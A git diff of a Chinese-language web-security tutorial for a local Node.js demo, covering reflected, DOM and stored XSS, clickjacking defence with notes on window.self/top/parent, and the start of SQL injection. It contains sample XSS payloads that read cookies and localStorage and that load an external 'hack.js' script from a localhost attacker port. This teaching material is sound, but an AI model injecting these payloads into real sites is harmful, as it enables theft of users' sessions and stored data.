@@ -39,7 +39,8 @@ $ nodemon index.js
   * 攻击构造出特殊的URL,包含恶意代码列如:
   ```shell
    $ http://localhost:3699/?from=<script>alert(document.cookie)</script>
-   $ http://localhost:3699/?from=<script>alert(JSON.stringify(localStorage))</script>
+   $ http://localhost:3699/?from=<script>alert(JSON.stringify(localStorage))</script> 
+   $ http://localhost:3699/?from=<script src='http://localhost:4396/hack.js'></script>
   ```
 2. DOM型XSS
   * 攻击者构造出URL,包含恶意代码,进行XSS攻击
@@ -52,7 +53,7 @@ $ nodemon index.js
   # 评论
   $ <script>alert(1)</script>
   # 跨站脚本注入 * 评论或者其他方式 注入到页面
-  $ 这是一条评论 <script src="http://localhost:4000/hack.js"></script>
+  $ 这是一条评论 <script src='http://localhost:4396/hack.js'></script>
   ```
 
 ##### XSS防护
@@ -139,6 +140,28 @@ $ nodemon index.js
       </body>
     ```
     在页面中写入该代码,当通过iframe 加载页面时,攻击者网页直接不显示防御者的网页内容
+
+```
+小知识
+    . window.self
+    功能：是对当前窗口自身的引用。它和window属性是等价的。
+
+    语法：window.self
+
+    注：window、self、window.self是等价的。
+
+    2. window.top
+    功能：返回顶层窗口，即浏览器窗口。
+
+    语法：window.top
+
+    注：如果窗口本身就是顶层窗口，top属性返回的是对自身的引用。
+
+    3. window.parent
+    功能：返回父窗口。
+
+    语法：window.parent
+```
 
 ### SQL注入
 * 场景
